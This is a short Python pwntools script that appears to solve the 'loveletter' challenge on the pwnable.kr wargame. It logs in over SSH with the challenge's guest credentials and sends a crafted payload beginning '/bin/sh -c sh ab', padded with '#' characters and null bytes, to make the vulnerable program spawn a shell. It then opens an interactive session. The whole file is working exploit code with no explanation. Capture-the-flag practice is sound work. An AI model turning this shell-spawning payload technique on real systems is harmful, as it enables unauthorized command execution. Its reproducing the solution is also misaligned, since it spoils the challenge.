from pwn import *

#context.log_level = 'debug'
local = False

if local:
	conn = process(['gdb-peda',"./loveletter"])
	conn.sendline("break system")
	conn.sendline("r")
	#conn = process("./loveletter")
else:
	s = ssh(user='loveletter',host='pwnable.kr',port=2222,password='guest')
	conn = s.connect_remote('localhost', 9031)

payload = "/bin/sh -c sh ab"+"#"*80
payload += "\x00"*(255-len(payload))

conn.sendline(payload)
conn.interactive()
